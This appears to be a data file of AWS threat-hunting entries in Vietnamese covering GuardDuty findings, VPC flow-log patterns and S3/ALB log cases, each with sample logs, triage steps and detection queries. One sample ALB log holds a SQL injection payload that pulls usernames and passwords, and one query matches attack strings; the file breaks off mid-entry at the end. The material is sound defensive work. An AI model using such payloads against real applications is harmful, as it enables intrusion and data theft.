["aws-guardduty","UnauthorizedAccess:EC2/SSHBruteForce","Dò mật khẩu SSH trên EC2","m","T1110","Một EC2 instance là nguồn hoặc đích của hoạt động dò mật khẩu SSH (nhiều lần kết nối cổng 22) được phát hiện qua VPC Flow Logs.","type: Recon/UnauthorizedAccess EC2 SSHBruteForce\nresource.instanceDetails.instanceId: instance liên quan\nservice.action.networkConnectionAction.remoteIpDetails.ipAddressV4: IP tấn công\nservice.action.networkConnectionAction.remotePortDetails.port: cổng từ xa (thường 22)\nservice.count: số lần kết nối thử\nservice.eventFirstSeen / eventLastSeen: khung thời gian diễn ra brute force","{\n  \"type\": \"UnauthorizedAccess:EC2/SSHBruteForce\",\n  \"severity\": 2,\n  \"resource\": {\"instanceDetails\": {\"instanceId\": \"i-0f1e2d3c4b5a69870\"}},\n  \"service\": {\n    \"action\": {\n      \"actionType\": \"NETWORK_CONNECTION\",\n      \"networkConnectionAction\": {\n        \"remoteIpDetails\": {\"ipAddressV4\": \"198.51.100.23\"},\n        \"remotePortDetails\": {\"port\": 22}\n      }\n    },\n    \"count\": 231,\n    \"eventFirstSeen\": \"2026-10-20T01:02:03Z\",\n    \"eventLastSeen\": \"2026-10-20T01:40:11Z\"\n  }\n}","Kiểm tra xem có đăng nhập SSH thành công nào ngay sau đợt brute force không (auth.log/CloudTrail nếu dùng SSM) và chặn IP nguồn.","aws guardduty list-findings --detector-id <detectorId> --finding-criteria '{\"Criterion\":{\"type\":{\"Eq\":[\"UnauthorizedAccess:EC2/SSHBruteForce\"]}}}'"],

["aws-guardduty","CredentialAccess:IAMUser/AnomalousBehavior","Hành vi bất thường của IAM user (truy cập thông tin xác thực)","h","T1078.004","Một IAM principal gọi API liên quan tới credential (vd GetCredentialReport, GenerateCredentialReport) theo cách khác thường so với lịch sử sử dụng của chính entity đó, do GuardDuty ML phát hiện.","type: CredentialAccess:IAMUser/AnomalousBehavior\nresource.accessKeyDetails.userName / principalId: IAM user/role thực hiện hành động\nservice.action.awsApiCallAction.api: tên API được gọi\nservice.action.awsApiCallAction.remoteIpDetails.ipAddressV4: IP nguồn gọi API\nservice.additionalInfo.recentApiCalls: các API call gần đây liên quan\nseverity: Medium theo mặc định của AWS","{\n  \"type\": \"CredentialAccess:IAMUser/AnomalousBehavior\",\n  \"severity\": 5,\n  \"resource\": {\"accessKeyDetails\": {\"userName\": \"svc-deploy\", \"userType\": \"IAMUser\"}},\n  \"service\": {\n    \"action\": {\n      \"actionType\": \"AWS_API_CALL\",\n      \"awsApiCallAction\": {\"api\": \"GetCredentialReport\", \"serviceName\": \"iam.amazonaws.com\", \"remoteIpDetails\": {\"ipAddressV4\": \"203.0.113.9\"}}\n    }\n  }\n}","Tra lại CloudTrail các lệnh gọi trước/sau của cùng principal để xác định đây là tool tự động hợp lệ hay dấu hiệu thu thập thông tin xác thực của kẻ tấn công.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=<userName> --max-results 50"],

["aws-guardduty","UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B","Đăng nhập console thành công bất thường","h","T1078.004","Một IAM user đăng nhập thành công vào AWS Console từ một API caller/vị trí/thiết bị bất thường so với hành vi thường thấy của user đó.","type: UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B\nresource.accessKeyDetails.userName: user đăng nhập\nservice.action.awsApiCallAction.remoteIpDetails.ipAddressV4: IP nguồn đăng nhập\nservice.action.awsApiCallAction.remoteIpDetails.country.countryName: quốc gia nguồn\nservice.additionalInfo.loginAttributes: thông tin về MFA/user-agent nếu có\nservice.eventFirstSeen: thời điểm đăng nhập","{\n  \"type\": \"UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B\",\n  \"severity\": 5,\n  \"resource\": {\"accessKeyDetails\": {\"userName\": \"jsmith\", \"userType\": \"IAMUser\"}},\n  \"service\": {\n    \"action\": {\n      \"actionType\": \"AWS_API_CALL\",\n      \"awsApiCallAction\": {\"api\": \"ConsoleLogin\", \"remoteIpDetails\": {\"ipAddressV4\": \"192.0.2.77\", \"country\": {\"countryName\": \"Vietnam\"}}}\n    },\n    \"eventFirstSeen\": \"2026-10-23T22:14:00Z\"\n  }\n}","Xác nhận với chủ tài khoản xem có thực sự đăng nhập từ vị trí/IP đó không; nếu không, xoay vòng access key/mật khẩu và kiểm tra MFA ngay.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin --start-time 2026-10-23T00:00:00Z"],

["aws-guardduty","Backdoor:EC2/C&CActivity.B!DNS","EC2 liên lạc với máy chủ C2 qua DNS","c","T1071.004","Một EC2 instance thực hiện truy vấn DNS tới tên miền được biết là hạ tầng command-and-control, cho thấy instance có khả năng đã bị cài backdoor/malware.","type: Backdoor:EC2/C&CActivity.B!DNS\nresource.instanceDetails.instanceId: instance thực hiện truy vấn\nservice.action.dnsRequestAction.domain: tên miền C2 được truy vấn\nservice.action.dnsRequestAction.protocol: giao thức DNS sử dụng\nservice.additionalInfo.threatListName: danh sách threat intel khớp\nservice.count: số lần truy vấn tới domain đó","{\n  \"type\": \"Backdoor:EC2/C&CActivity.B!DNS\",\n  \"severity\": 8,\n  \"resource\": {\"instanceDetails\": {\"instanceId\": \"i-0123456789abcdef0\"}},\n  \"service\": {\n    \"action\": {\n      \"actionType\": \"DNS_REQUEST\",\n      \"dnsRequestAction\": {\"domain\": \"malicious-c2.example\", \"protocol\": \"UDP\"}\n    },\n    \"count\": 6,\n    \"additionalInfo\": {\"threatListName\": \"ProofPoint\"}\n  }\n}","Cô lập ngay instance, thu thập memory/disk image, và tìm tiến trình/binary thực hiện truy vấn DNS đó trên host.","aws guardduty get-findings --detector-id <detectorId> --finding-ids <findingId>"],

["aws-guardduty","CryptoCurrency:EC2/BitcoinTool.B","EC2 chạy công cụ đào tiền điện tử","h","T1496","EC2 instance kết nối mạng tới một địa chỉ IP liên quan đến pool đào Bitcoin/tiền điện tử, cho thấy tài nguyên đã bị chiếm dụng để khai thác tiền mã hóa.","type: CryptoCurrency:EC2/BitcoinTool.B\nresource.instanceDetails.instanceId: instance bị nghi ngờ đào coin\nservice.action.networkConnectionAction.remoteIpDetails.ipAddressV4: IP của mining pool\nservice.action.networkConnectionAction.remotePortDetails.port: cổng kết nối tới pool\nservice.resourceRole: TARGET hoặc ACTOR\nservice.count: số kết nối tới pool trong khung thời gian","{\n  \"type\": \"CryptoCurrency:EC2/BitcoinTool.B\",\n  \"severity\": 7,\n  \"resource\": {\"instanceDetails\": {\"instanceId\": \"i-0a1b2c3d4e5f67890\"}},\n  \"service\": {\n    \"action\": {\n      \"actionType\": \"NETWORK_CONNECTION\",\n      \"networkConnectionAction\": {\"remoteIpDetails\": {\"ipAddressV4\": \"198.51.100.200\"}, \"remotePortDetails\": {\"port\": 8333}}\n    },\n    \"resourceRole\": \"ACTOR\",\n    \"count\": 42\n  }\n}","Kiểm tra CPU usage bất thường trên instance, liệt kê tiến trình đang chạy, và xác định nguồn gốc xâm nhập ban đầu (lỗ hổng ứng dụng, key bị lộ, AMI không an toàn).","aws guardduty list-findings --detector-id <detectorId> --finding-criteria '{\"Criterion\":{\"type\":{\"Eq\":[\"CryptoCurrency:EC2/BitcoinTool.B\"]}}}'"],

["aws-guardduty","Exfiltration:S3/MaliciousIPCaller","Dữ liệu S3 bị truy cập từ IP độc hại (nghi exfiltration)","c","T1537","Một địa chỉ IP nằm trong danh sách đe dọa đã biết thực hiện các API call đọc dữ liệu (GetObject) trên S3 bucket theo cách bất thường, cho thấy khả năng dữ liệu đang bị lấy ra ngoài.","type: Exfiltration:S3/MaliciousIPCaller\nresource.s3BucketDetails[].name: bucket bị truy cập\nservice.action.awsApiCallAction.api: API được gọi (vd GetObject)\nservice.action.awsApiCallAction.remoteIpDetails.ipAddressV4: IP độc hại gọi API\nservice.additionalInfo.threatListName: nguồn threat intel khớp IP\nservice.count: số lần gọi API trong khung thời gian","{\n  \"type\": \"Exfiltration:S3/MaliciousIPCaller\",\n  \"severity\": 8,\n  \"resource\": {\"s3BucketDetails\": [{\"name\": \"corp-reports-prod\"}]},\n  \"service\": {\n    \"action\": {\n      \"actionType\": \"AWS_API_CALL\",\n      \"awsApiCallAction\": {\"api\": \"GetObject\", \"remoteIpDetails\": {\"ipAddressV4\": \"203.0.113.88\"}}\n    },\n    \"additionalInfo\": {\"threatListName\": \"AWSManagedThreatIntel\"},\n    \"count\": 318\n  }\n}","Đối chiếu CloudTrail data events của bucket để xem tổng khối lượng dữ liệu đã tải xuống và nguồn gốc của credential đã dùng để gọi API.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=ResourceName,AttributeValue=<bucketName> --start-time 2026-10-20T00:00:00Z"],

["aws-guardduty","Stealth:IAMUser/CloudTrailLoggingDisabled","CloudTrail logging bị tắt","h","T1562.008","Một IAM principal gọi API StopLogging hoặc DeleteTrail để tắt hoặc xóa CloudTrail trail, thường là bước che giấu dấu vết trước khi thực hiện hành vi độc hại tiếp theo.","type: Stealth:IAMUser/CloudTrailLoggingDisabled\nresource.accessKeyDetails.userName: principal thực hiện hành động\nservice.action.awsApiCallAction.api: StopLogging hoặc DeleteTrail\nservice.action.awsApiCallAction.remoteIpDetails.ipAddressV4: IP nguồn gọi API\nservice.action.awsApiCallAction.affectedResources: trail bị tác động\nseverity: Low mặc định nhưng ý nghĩa thực tế rất cao đối với threat hunter","{\n  \"type\": \"Stealth:IAMUser/CloudTrailLoggingDisabled\",\n  \"severity\": 2,\n  \"resource\": {\"accessKeyDetails\": {\"userName\": \"temp-admin\", \"userType\": \"IAMUser\"}},\n  \"service\": {\n    \"action\": {\n      \"actionType\": \"AWS_API_CALL\",\n      \"awsApiCallAction\": {\"api\": \"StopLogging\", \"serviceName\": \"cloudtrail.amazonaws.com\", \"remoteIpDetails\": {\"ipAddressV4\": \"192.0.2.150\"}}\n    }\n  }\n}","Coi đây là tín hiệu ưu tiên cao nhất: lập tức bật lại logging, khóa credential vừa dùng, và rà soát toàn bộ hoạt động của principal đó ngay trước và sau thời điểm này.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=StopLogging"],

["aws-guardduty","PrivilegeEscalation:IAMUser/AnomalousBehavior","Hành vi bất thường của IAM user (leo thang đặc quyền)","h","T1098","Một IAM principal gọi các API có khả năng leo thang đặc quyền (vd AttachUserPolicy, CreateAccessKey cho user khác, PutRolePolicy) theo cách khác thường so với baseline hành vi của chính nó.","type: PrivilegeEscalation:IAMUser/AnomalousBehavior\nresource.accessKeyDetails.userName / principalId: principal thực hiện hành động\nservice.action.awsApiCallAction.api: API leo thang đặc quyền được gọi\nservice.action.awsApiCallAction.serviceName: dịch vụ AWS bị tác động (vd iam.amazonaws.com)\nservice.additionalInfo.recentApiCalls: chuỗi API call liên quan gần đây\nseverity: Medium mặc định","{\n  \"type\": \"PrivilegeEscalation:IAMUser/AnomalousBehavior\",\n  \"severity\": 5,\n  \"resource\": {\"accessKeyDetails\": {\"userName\": \"app-readonly\", \"userType\": \"IAMUser\"}},\n  \"service\": {\n    \"action\": {\n      \"actionType\": \"AWS_API_CALL\",\n      \"awsApiCallAction\": {\"api\": \"AttachUserPolicy\", \"serviceName\": \"iam.amazonaws.com\"}\n    }\n  }\n}","Xác minh thay đổi policy có được phê duyệt qua quy trình thay đổi hay không; nếu không, thu hồi quyền vừa được cấp và điều tra toàn bộ phiên làm việc của principal.","aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AttachUserPolicy"],

["aws-vpcflow","REJECT port scan","Quét cổng bị từ chối (REJECT)","h","T1595.001","Một srcaddr gửi hàng loạt kết nối tới nhiều dstport khác nhau trên cùng một hoặc nhiều dstaddr trong thời gian ngắn và toàn bộ bị action=REJECT, dấu hiệu điển hình của quét cổng từ bên ngoài.","srcaddr: địa chỉ IP nguồn thực hiện quét\ndstaddr: địa chỉ đích đang bị dò\ndstport: cổng đích được thử (nhiều giá trị khác nhau)\nprotocol: số hiệu giao thức IP (6=TCP, 17=UDP)\naction: REJECT nghĩa là bị security group/NACL chặn\npackets/bytes: thường rất nhỏ (1 gói, ~40-60 byte) vì không bắt tay thành công","2 123456789010 eni-1235b8ca123456789 198.51.100.23 10.0.1.15 54321 22 6 1 40 1700000000 1700000010 REJECT OK\n2 123456789010 eni-1235b8ca123456789 198.51.100.23 10.0.1.15 54322 23 6 1 40 1700000001 1700000011 REJECT OK\n2 123456789010 eni-1235b8ca123456789 198.51.100.23 10.0.1.15 54323 3389 6 1 40 1700000002 1700000012 REJECT OK","Đếm số dstport riêng biệt theo từng cặp srcaddr/dstaddr trong cửa sổ ngắn, đối chiếu srcaddr với threat intel và cảnh báo GuardDuty (Recon:EC2/PortProbeUnprotectedPort).","filter action=\"REJECT\"\n| stats count(*) as attempts, count_distinct(dstPort) as distinctPorts by srcAddr, dstAddr\n| filter distinctPorts > 10\n| sort distinctPorts desc\n| limit 20"],

["aws-vpcflow","Internal recon scan","Dò quét nội bộ giữa các subnet","h","T1046","Một địa chỉ IP nội bộ kết nối tới số lượng lớn dstaddr khác nhau trong VPC trên các cổng dịch vụ phổ biến (22, 445, 3389, 135) trong thời gian ngắn, cho thấy khả năng máy đã bị xâm nhập đang dò tìm dịch vụ nội bộ.","srcaddr: địa chỉ IP nội bộ nghi ngờ đã bị xâm nhập\ndstaddr: nhiều địa chỉ nội bộ khác nhau bị dò (cùng subnet hoặc khác subnet)\ndstport: các cổng dịch vụ phổ biến được thử\nprotocol: giao thức IP dùng để dò (thường là TCP = 6)\naction: ACCEPT hoặc REJECT đều có giá trị (REJECT = bị chặn bởi SG/NACL, ACCEPT = dịch vụ có tồn tại và phản hồi)","2 123456789010 eni-aaaa1111bbbb2222c 10.0.1.50 10.0.2.10 51000 445 6 1 40 1700000100 1700000110 REJECT OK\n2 123456789010 eni-aaaa1111bbbb2222c 10.0.1.50 10.0.2.11 51001 445 6 1 40 1700000101 1700000111 REJECT OK\n2 123456789010 eni-aaaa1111bbbb2222c 10.0.1.50 10.0.2.12 51002 3389 6 1 40 1700000102 1700000112 REJECT OK","So sánh srcaddr với bản đồ phân vùng mạng (ai được phép nói chuyện với ai); nếu lệch khỏi baseline, kiểm tra EDR và tiến trình đang chạy trên host nguồn.","filter isIpv4InSubnet(srcAddr,\"10.0.0.0/16\") and isIpv4InSubnet(dstAddr,\"10.0.0.0/16\")\n| stats count_distinct(dstAddr) as uniqueHosts, count_distinct(dstPort) as uniquePorts by srcAddr\n| filter uniqueHosts > 20\n| sort uniqueHosts desc\n| limit 20"],

["aws-vpcflow","Public admin port exposure","Cổng quản trị mở ra Internet được chấp nhận","c","T1133","Lưu lượng tới cổng 22 (SSH) hoặc 3389 (RDP) từ một địa chỉ IP công cộng bất kỳ (ngoài dải CIDR nội bộ) được ghi nhận action=ACCEPT, cho thấy security group đang cho phép truy cập quản trị trực tiếp từ Internet.","dstport: 22 hoặc 3389 (cổng quản trị)\nsrcaddr: địa chỉ IP công cộng, không thuộc dải nội bộ của tổ chức\ndstaddr: instance đang bị lộ cổng quản trị\naction: ACCEPT xác nhận security group/NACL đã cho phép\npackets/bytes: số gói/byte của phiên, phiên kéo dài có thể là đăng nhập thành công","2 123456789010 eni-0ab1c2d3e4f567890 203.0.113.44 10.0.1.15 51702 22 6 10 1500 1700000200 1700000260 ACCEPT OK\n2 123456789010 eni-0ab1c2d3e4f567890 198.51.100.9 10.0.1.20 40711 3389 6 15 2200 1700000300 1700000360 ACCEPT OK","Xác định security group gắn với eni liên quan, kiểm tra có rule ingress 0.0.0.0/0 cho cổng 22/3389 hay không, đối chiếu CloudTrail (AuthorizeSecurityGroupIngress) và log đăng nhập OS cùng thời điểm.","filter action=\"ACCEPT\" and (dstPort=22 or dstPort=3389) and not isIpv4InSubnet(srcAddr,\"10.0.0.0/8\")\n| stats count(*) as attempts by srcAddr, dstAddr, dstPort\n| sort attempts desc\n| limit 20"],

["aws-vpcflow","Unusual lateral RDP/SSH","Di chuyển ngang bất thường giữa các subnet (RDP/SSH)","h","T1021","Kết nối ACCEPT trên cổng 3389/22/445 xuất hiện giữa hai subnet vốn không có quan hệ giao tiếp trong baseline (ví dụ từ subnet web-tier sang subnet database-tier), gợi ý kẻ tấn công đang dùng dịch vụ truy cập từ xa hợp lệ để di chuyển ngang.","srcaddr: địa chỉ trong subnet nguồn (ví dụ web-tier)\ndstaddr: địa chỉ trong subnet đích vốn không nên nhận kết nối này (ví dụ db-tier)\ndstport: 3389 (RDP), 22 (SSH) hoặc 445 (SMB)\naction: ACCEPT nghĩa là kết nối đã được thiết lập\nbytes/packets: khối lượng phiên, phiên dài có thể là phiên làm việc thực sự","2 123456789010 eni-web01aaa1111bbb 10.0.1.25 10.0.3.40 55210 3389 6 120 18000 1700000400 1700000520 ACCEPT OK\n2 123456789010 eni-web01aaa1111bbb 10.0.1.25 10.0.3.41 55390 22 6 95 14300 1700000600 1700000700 ACCEPT OK","Đối chiếu cặp subnet nguồn/đích với sơ đồ phân vùng mạng đã duyệt, kiểm tra sự kiện đăng nhập trên host đích (Windows Security 4624 Logon Type 10, hoặc sshd Accepted) trùng thời điểm flow.","filter action=\"ACCEPT\" and (dstPort=3389 or dstPort=22 or dstPort=445) and isIpv4InSubnet(srcAddr,\"10.0.1.0/24\") and isIpv4InSubnet(dstAddr,\"10.0.3.0/24\")\n| stats count(*) as sessions, sum(bytes) as totalBytes by srcAddr, dstAddr, dstPort\n| sort sessions desc\n| limit 20"],

["aws-vpcflow","High-volume egress","Lưu lượng egress bất thường lớn (nghi rò rỉ dữ liệu)","c","T1048","Một ENI nội bộ truyền một khối lượng bytes/packets lớn bất thường tới một dstaddr bên ngoài so với baseline thông thường, dấu hiệu có thể của việc rò rỉ dữ liệu ra ngoài qua một giao thức thông thường (HTTPS, FTP...).","srcaddr: địa chỉ nội bộ gửi dữ liệu\ndstaddr: địa chỉ IP bên ngoài, không thuộc tổ chức\nbytes: tổng số byte truyền trong flow, cao bất thường so với baseline\npackets: số gói tương ứng\ndstport: cổng đích (443, 21, hoặc cổng lạ)\nstart/end: khoảng thời gian của phiên truyền","2 123456789010 eni-app07ccc3333ddd 10.0.1.80 198.51.100.77 51321 443 6 95000 140000000 1700001000 1700001600 ACCEPT OK","So sánh tổng bytes của cặp srcaddr/dstaddr với baseline 30 ngày, kiểm tra dstaddr với threat intel/whitelist, đối chiếu với CloudTrail truy cập S3/Secrets Manager cùng thời điểm trên cùng tài khoản/role.","filter action=\"ACCEPT\" and not isIpv4InSubnet(dstAddr,\"10.0.0.0/16\")\n| stats sum(bytes) as totalBytes, sum(packets) as totalPackets by srcAddr, dstAddr\n| sort totalBytes desc\n| limit 20"],

["aws-vpcflow","DNS tunneling pattern","Dấu hiệu DNS tunneling","h","T1071.004","Lưu lượng UDP/53 giữa một srcaddr và một dstaddr có tổng bytes hoặc số lượng truy vấn cao bất thường so với truy vấn DNS thông thường, gợi ý DNS đang bị dùng làm kênh C2 hoặc exfiltration.","dstport: 53 (DNS)\nprotocol: 17 (UDP)\nsrcaddr: host nội bộ phát sinh truy vấn DNS bất thường\ndstaddr: DNS resolver/máy chủ nhận truy vấn (nội bộ hoặc ngoài)\nbytes: tổng byte cao bất thường so với mức ~100 byte/truy vấn DNS thông thường\npackets: số lượng gói/truy vấn trong khoảng thời gian ngắn","2 123456789010 eni-app12eee4444fff 10.0.1.95 203.0.113.90 54210 53 17 420 310000 1700002000 1700002300 ACCEPT OK\n2 123456789010 eni-app12eee4444fff 10.0.1.95 203.0.113.90 54399 53 17 455 335000 1700002301 1700002600 ACCEPT OK","So sánh tổng bytes/số truy vấn theo cặp srcaddr-dstaddr với baseline DNS bình thường, đối chiếu tên miền truy vấn trong Route 53 Resolver query logs tại cùng thời điểm.","filter dstPort=53 and protocol=17\n| stats sum(bytes) as totalBytes, count(*) as queries by srcAddr, dstAddr\n| filter totalBytes > 200000\n| sort totalBytes desc\n| limit 20"],

["aws-vpcflow","Protocol tunneling beaconing","Tunnel giao thức/beaconing qua cổng được phép","h","T1572","Một host nội bộ phát sinh các flow egress lặp lại đều đặn tới cùng một dstaddr qua cổng được phép như 443 hoặc 22, với khối lượng byte nhỏ và chu kỳ ổn định, gợi ý tunnel giao thức (ví dụ reverse shell qua TLS, SSH tunneling) để né network control.","srcaddr: host nội bộ nghi ngờ đang beaconing\ndstaddr: địa chỉ IP ngoài cố định nhận beacon\ndstport: cổng được phép (443 hoặc 22) dùng để che giấu kênh\nbytes: khối lượng nhỏ và gần như không đổi giữa các flow\nstart/end: khoảng cách giữa các flow liên tiếp gần như cố định (jitter thấp)","2 123456789010 eni-srv22gg5555hhh 10.0.1.60 192.0.2.150 51122 443 6 12 1800 1700003000 1700003060 ACCEPT OK\n2 123456789010 eni-srv22gg5555hhh 10.0.1.60 192.0.2.150 51145 443 6 11 1750 1700003600 1700003660 ACCEPT OK\n2 123456789010 eni-srv22gg5555hhh 10.0.1.60 192.0.2.150 51167 443 6 13 1820 1700004200 1700004260 ACCEPT OK","Kiểm tra tính đều đặn (jitter thấp) của khoảng cách thời gian giữa các flow tới cùng dstaddr, đối chiếu dstaddr với threat intel/JA3 fingerprint TLS, xem truy vấn DNS trước đó đã resolve domain nào.","filter action=\"ACCEPT\" and dstPort=443\n| stats count(*) as connections, avg(bytes) as avgBytes, stddev(bytes) as bytesStdDev by srcAddr, dstAddr\n| filter connections > 20\n| sort connections desc\n| limit 20"],

["aws-web","s3-anon-public-get","S3: Tải đối tượng ẩn danh thành công","h","T1530","Một request GetObject không xác thực (Requester = \"-\") trả về HTTP 200 trên một bucket/key nhạy cảm, cho thấy bucket hoặc object đang bị public và có khả năng rò rỉ dữ liệu.","Requester: \"-\" nghĩa là request không có danh tính IAM (ẩn danh)\nOperation: REST.GET.OBJECT là thao tác tải object\nKey: đường dẫn object bị truy cập, càng nhạy cảm càng nguy hiểm\nHTTP_status: 200 nghĩa là request thành công, không bị chặn\nAuthentication_Type: \"-\" xác nhận không có SigV4/SigV2 nào được dùng","79a59df900b949e55d96a1e698fbacedfd6e09d98eacf8f8d5218e7cd47ef2be finance-reports-prod [24/Oct/2026:03:14:22 +0000] 203.0.113.77 - 7A3B9C1D2EXAMPLE REST.GET.OBJECT confidential/q3-earnings.pdf \"GET /finance-reports-prod/confidential/q3-earnings.pdf HTTP/1.1\" 200 - 2458112 2458112 88 12 \"-\" \"python-requests/2.31.0\" - 9vKBE6vMhrNiWHZmb2L0mXOcqPGzQOI5XLnCtZNPxev1234= - ECDHE-RSA-AES128-GCM-SHA256 - finance-reports-prod.s3.ap-southeast-1.amazonaws.com TLSv1.2 - Yes ap-southeast-1","Lọc toàn bộ record có Requester = \"-\" và HTTP_status = 200 trên các bucket chứa dữ liệu nội bộ/nhạy cảm.","aws s3api get-bucket-acl --bucket finance-reports-prod; aws s3api get-bucket-policy-status --bucket finance-reports-prod\n-- Athena cross-check:\nSELECT requestdatetime, remoteip, key, httpstatus, useragent\nFROM s3_access_logs\nWHERE requester = '-' AND operation = 'REST.GET.OBJECT' AND httpstatus = '200'\nORDER BY requestdatetime DESC LIMIT 100;"],

["aws-web","s3-403-enum","S3: Dò quét key gây tăng đột biến AccessDenied","m","T1580","Một IP/requester tạo ra số lượng lớn request REST.GET.OBJECT với lỗi 403 AccessDenied trên nhiều Key khác nhau trong thời gian ngắn, dấu hiệu của việc dò tên object/bucket để tìm tài nguyên lộ.","Remote_IP: nguồn gửi hàng loạt request dò quét\nKey: tên object được đoán, thường theo wordlist (backup, db, config...)\nHTTP_status / Error_Code: 403 / AccessDenied cho thấy request bị từ chối quyền\nUser-Agent: thường là công cụ tự động (scanner, script) thay vì trình duyệt","79a59df900b949e55d96a1e698fbacedfd6e09d98eacf8f8d5218e7cd47ef2be company-assets [24/Oct/2026:09:02:17 +0000] 198.51.100.44 - 88B1C2A3EXAMPLE REST.GET.OBJECT backup/db_2024.sql \"GET /company-assets/backup/db_2024.sql HTTP/1.1\" 403 AccessDenied 243 - 9 - \"-\" \"Mozilla/5.0 (compatible; masscan/1.3)\" - BNaBsXZQQDbssi6xMBdBU2sLt+Yf5kZDmeBUP35sFoKa1234= - - - - company-assets.s3.us-east-1.amazonaws.com TLSv1.2 - Yes -","Nhóm theo Remote_IP, đếm số lượng Key khác nhau có HTTP_status 403 trong một khung thời gian ngắn, cảnh báo nếu vượt ngưỡng.","SELECT remoteip, COUNT(DISTINCT key) AS distinct_keys, COUNT(*) AS attempts\nFROM s3_access_logs\nWHERE httpstatus = '403' AND errorcode = 'AccessDenied'\n  AND requestdatetime BETWEEN '24/Oct/2026:08:00:00' AND '24/Oct/2026:10:00:00'\nGROUP BY remoteip\nHAVING COUNT(DISTINCT key) > 50\nORDER BY distinct_keys DESC;"],

["aws-web","s3-bulk-get-exfil","S3: Tải hàng loạt object nghi vấn chuyển dữ liệu ra ngoài","c","T1537","Một assumed role/IAM principal thực hiện số lượng lớn REST.GET.OBJECT trên nhiều object chứa dữ liệu nhạy cảm (PII, export) trong thời gian ngắn, phù hợp với hành vi chuẩn bị chuyển dữ liệu sang tài khoản/đích khác.","Requester: ARN assumed-role thực hiện request, đối chiếu với vai trò bình thường của nó\nOperation: REST.GET.OBJECT lặp lại số lượng lớn\nBytes_Sent / Object_Size: tổng dung lượng tải ra bất thường lớn\nKey: các object bị tải, chú ý thư mục exports/backup/PII","79a59df900b949e55d96a1e698fbacedfd6e09d98eacf8f8d5218e7cd47ef2be customer-pii-archive [24/Oct/2026:14:55:03 +0000] 10.0.4.212 arn:aws:sts::123456789012:assumed-role/DataAnalystRole/sess-ext-contractor 5F2A9D0CEXAMPLE REST.GET.OBJECT exports/2026/customers_part_0417.csv.gz \"GET /customer-pii-archive/exports/2026/customers_part_0417.csv.gz HTTP/1.1\" 200 - 18874368 18874368 410 55 \"-\" \"aws-cli/2.15.30 Python/3.11.6\" - 10S62Zv81kBW7BB6SX4XJ48o6kpcl6LPwEoizZQQxJd5qDSCTLX01234= SigV4 ECDHE-RSA-AES128-GCM-SHA256 AuthHeader customer-pii-archive.s3.eu-west-1.amazonaws.com TLSv1.2 - Yes eu-west-1","Tổng hợp số object và tổng Bytes_Sent theo Requester trong cửa sổ 1 giờ, cảnh báo khi vượt baseline lịch sử nhiều lần.","SELECT requester, COUNT(*) AS objects_fetched, SUM(TRY_CAST(bytessent AS BIGINT)) AS total_bytes\nFROM s3_access_logs\nWHERE operation = 'REST.GET.OBJECT' AND requester LIKE 'arn:aws:sts::%assumed-role%'\n  AND requestdatetime > date_format(date_add('hour', -1, current_timestamp), '%d/%b/%Y:%H:%i:%s')\nGROUP BY requester\nHAVING COUNT(*) > 200\nORDER BY total_bytes DESC;"],

["aws-web","alb-waf-bypass-payload","ALB: Payload tấn công vượt qua WAF tới được backend","c","T1190","Request chứa payload SQL injection/XSS trong URL được chuyển tiếp (actions_executed=\"forward\") và backend trả về target_status_code 200, cho thấy payload không bị WAF chặn và có thể đã khai thác thành công ứng dụng.","request: dòng request chứa chuỗi tấn công (UNION SELECT, <script>...)\nactions_executed: \"forward\" nghĩa là request được chuyển tới target, không bị \"waf\" chặn\ntarget_status_code: 200 nghĩa là ứng dụng xử lý và trả về thành công\nelb_status_code: mã trạng thái ALB trả cho client\nuser_agent: công cụ khai thác tự động thường có chữ ký đặc trưng","https 2026-10-24T08:12:44.511265Z app/prod-web-alb/1234567890abcdef 198.51.100.23:51422 10.0.2.15:8080 0.002 0.184 0.001 200 200 612 3109 \"GET https://shop.example.com:443/search?q=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--%20 HTTP/1.1\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\" ECDHE-RSA-AES128-GCM-SHA256 TLSv1.2 arn:aws:elasticloadbalancing:ap-southeast-1:123456789012:targetgroup/prod-web-tg/73e2d6bc24d8a067 \"Root=1-653a1a2c-36d228ad5d99923122bbe354\" \"shop.example.com\" \"arn:aws:acm:ap-southeast-1:123456789012:certificate/abcd1234\" 3 2026-10-24T08:12:44.325000Z \"forward\" \"-\" \"-\" \"10.0.2.15:8080\" \"200\" \"-\" \"-\" TID_9f8e7d6c5b4a3210 \"-\" \"-\" \"-\"","Lọc request có từ khóa tấn công phổ biến trong trường request, kết hợp target_status_code 200 và actions_executed không chứa \"waf\".","SELECT time, client_ip, request_url, target_status_code, actions_executed\nFROM alb_logs\nWHERE (request_url LIKE '%UNION%SELECT%' OR request_url LIKE '%<script%' OR request_url LIKE '%../%')\n  AND target_status_code = '200'\nORDER BY time DESC LIMIT 100;"],

["aws-web","alb-desync-smuggling","ALB: Request bị phân loại Severe nghi HTTP request smuggling","h","T1190","ALB gắn classification=\"Severe\" (ví dụ classification_reason=\"BothTeClPresent\") cho request không tuân thủ RFC 7230, dấu hiệu điển hình của tấn công desync/HTTP request smuggling nhắm vào ứng dụng public-facing.","classification: \"Severe\" nghĩa là request vi phạm nghiêm trọng chuẩn RFC 7230\nclassification_reason: mã lý do cụ thể, ví dụ BothTeClPresent (vừa có Transfer-Encoding vừa có Content-Length)\nrequest_processing_time: -1 cho thấy ALB không chuyển được request tới target\nelb_status_code: mã lỗi ALB trả về (thường 400) khi từ chối request bất thường","http 2026-10-24T11:40:02.902113Z app/prod-web-alb/1234567890abcdef 203.0.113.91:44210 10.0.2.18:8080 -1 -1 -1 400 - 812 0 \"POST http://shop.example.com:80/checkout HTTP/1.1\" \"curl/7.88.1\" - - arn:aws:elasticloadbalancing:ap-southeast-1:123456789012:targetgroup/prod-web-tg/73e2d6bc24d8a067 \"Root=1-653a2210-5e1234567890abcdef123456\" \"-\" \"-\" 0 2026-10-24T11:40:02.900000Z \"-\" \"-\" \"-\" \"-\" \"-\" \"Severe\" \"BothTeClPresent\" 